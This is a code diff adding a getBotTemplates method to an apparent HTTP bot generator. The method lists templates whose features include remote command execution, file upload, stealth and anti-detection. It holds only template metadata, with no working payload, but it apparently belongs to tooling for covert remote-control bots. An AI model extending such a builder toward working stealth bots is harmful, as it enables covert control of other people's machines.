@@ -1559,6 +1559,55 @@ class HTTPBotGenerator {
         
         return languageMap[ext] || 'unknown';
     }
+
+    async getBotTemplates() {
+        try {
+            const templates = [
+                {
+                    id: 'basic-http-bot',
+                    name: 'Basic HTTP Bot',
+                    description: 'Simple HTTP bot with basic functionality',
+                    language: 'javascript',
+                    features: ['heartbeat', 'command_execution', 'file_upload']
+                },
+                {
+                    id: 'advanced-http-bot',
+                    name: 'Advanced HTTP Bot',
+                    description: 'Advanced HTTP bot with encryption and stealth',
+                    language: 'python',
+                    features: ['heartbeat', 'command_execution', 'file_upload', 'encryption', 'stealth']
+                },
+                {
+                    id: 'cross-platform-bot',
+                    name: 'Cross-Platform Bot',
+                    description: 'Cross-platform bot supporting multiple languages',
+                    language: 'cpp',
+                    features: ['heartbeat', 'command_execution', 'file_upload', 'cross_platform']
+                },
+                {
+                    id: 'stealth-http-bot',
+                    name: 'Stealth HTTP Bot',
+                    description: 'Stealth HTTP bot with anti-detection features',
+                    language: 'javascript',
+                    features: ['heartbeat', 'command_execution', 'file_upload', 'stealth', 'anti_detection']
+                }
+            ];
+            
+            this.stats.operations++;
+            logger.info('HTTP Bot templates retrieved');
+            this.emit('templatesRetrieved', { count: templates.length });
+            
+            return {
+                success: true,
+                templates,
+                count: templates.length
+            };
+        } catch (error) {
+            logger.error('Failed to get HTTP bot templates:', error);
+            this.stats.errors++;
+            throw error;
+        }
+    }
 }
 
 // Create and export instance
